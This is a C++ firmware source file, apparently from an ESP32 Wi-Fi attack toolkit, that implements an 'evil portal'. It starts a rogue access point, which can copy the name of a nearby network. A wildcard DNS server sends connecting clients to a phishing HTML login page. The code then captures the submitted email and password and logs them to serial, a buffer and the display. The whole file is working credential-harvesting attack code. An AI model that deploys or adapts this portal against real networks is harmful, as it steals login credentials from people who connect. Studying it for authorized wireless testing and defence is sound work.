#include "EvilPortal.h"

AsyncWebServer server(80);

EvilPortal::EvilPortal() {
}

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;

  html_files = new LinkedList<String>();

  html_files->add("Back");

  #ifdef HAS_SD
    if (sd_obj.supported) {
      sd_obj.listDirToLinkedList(html_files, "/", "html");

      Serial.println("Evil Portal Found " + (String)html_files->size() + " HTML files");
    }
  #endif
}

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  if (!this->setAP(ssids, access_points))
    return false;
  if (!this->setHtml())
    return false;
    
  startPortal();

  return true;
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {
  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
    Serial.println("client connected");
    #ifdef HAS_SCREEN
      this->sendToDisplay("Client connected to server");
    #endif
  });

  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      this->user_name = inputMessage;
      this->name_received = true;
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      this->password = inputMessage;
      this->password_received = true;
    }
    request->send(
      200, "text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
  Serial.println("web server up");
}

void EvilPortal::setHtmlFromSerial() {
  Serial.println("Setting HTML from serial...");
  const char *htmlStr = Serial.readString().c_str();
  strncpy(index_html, htmlStr, strlen(htmlStr));
  this->has_html = true;
  this->using_serial_html = true;
  Serial.println("html set");
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    Serial.println("html previously set");
    return true;
  }
  Serial.println("Setting HTML...");
  #ifdef HAS_SD
    File html_file = sd_obj.getFile("/" + this->target_html_name);
  #else
    File html_file;
  #endif
  if (!html_file) {
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not find /" + this->target_html_name);
      this->sendToDisplay("Touch to exit...");
    #endif
    Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
    return false;
  }
  else {
    if (html_file.size() > MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given HTML is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_HTML_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("The provided HTML is too large. Byte limit is " + (String)MAX_HTML_SIZE + "\nUse stopscan...");
      return false;
    }
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    strncpy(index_html, html.c_str(), strlen(html.c_str()));
    this->has_html = true;
    Serial.println("html set");
    html_file.close();
    return true;
  }

}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // See if there are selected APs first
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    #ifdef HAS_SD
      File ap_config_file = sd_obj.getFile("/ap.config.txt");
    #else
      File ap_config_file;
    #endif
    // Could not open config file. return false
    if (!ap_config_file) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("Could not find /ap.config.txt.");
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("Could not find /ap.config.txt. Use stopscan...");
      return false;
    }
    // Config file good. Proceed
    else {
      // ap name too long. return false        
      if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
        #ifdef HAS_SCREEN
          this->sendToDisplay("The given AP name is too large.");
          this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
          this->sendToDisplay("Touch to exit...");
        #endif
        Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
        return false;
      }
      // AP name length good. Read from file into var
      while (ap_config_file.available()) {
        char c = ap_config_file.read();
        Serial.print(c);
        if (isPrintable(c)) {
          ap_config.concat(c);
        }
      }
      #ifdef HAS_SCREEN
        this->sendToDisplay("AP name from config file");
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from config file: " + ap_config);
      ap_config_file.close();
    }
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given AP name is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
      return false;
    }
    #ifdef HAS_SCREEN
      this->sendToDisplay("AP name from SSID list");
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    Serial.println("AP name from SSID list: " + ap_config);
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given AP name is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("The given AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
    }
    else {
      ap_config = temp_ap_name;
      #ifdef HAS_SCREEN
        this->sendToDisplay("AP name from AP list");
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from AP list: " + ap_config);
    }
  }
  else {
    Serial.println("Could not configure Access Point. Use stopscan...");
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not configure Access Point.");
      this->sendToDisplay("Touch to exit...");
    #endif
  }

  if (ap_config != "") {
    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
    this->has_ap = true;
    Serial.println("ap config set");
    return true;
  }
  else
    return false;

}

void EvilPortal::startAP() {
  const IPAddress AP_IP(172, 0, 0, 1);

  Serial.print("starting ap ");
  Serial.println(apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apName);

  #ifdef HAS_SCREEN
    this->sendToDisplay("AP started");
  #endif

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());

  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
  #ifdef HAS_SCREEN
    this->sendToDisplay("Evil Portal READY");
  #endif
}

void EvilPortal::startPortal() {
  // wait for flipper input to get config index
  this->startAP();

  this->runServer = true;
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    display_obj.loading = true;
    display_obj.display_buffer->add(display_string);
    display_obj.loading = false;
  #endif
}

void EvilPortal::main(uint8_t scan_mode) {
  if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && (this->has_ap) && (this->has_html)){
    this->dnsServer.processNextRequest();
    if (this->name_received && this->password_received) {
      this->name_received = false;
      this->password_received = false;
      String logValue1 =
          "u: " + this->user_name;
      String logValue2 = "p: " + this->password;
      String full_string = logValue1 + " " + logValue2 + "\n";
      Serial.print(full_string);
      buffer_obj.append(full_string);
      #ifdef HAS_SCREEN
        this->sendToDisplay(full_string);
      #endif
    }
  }
}
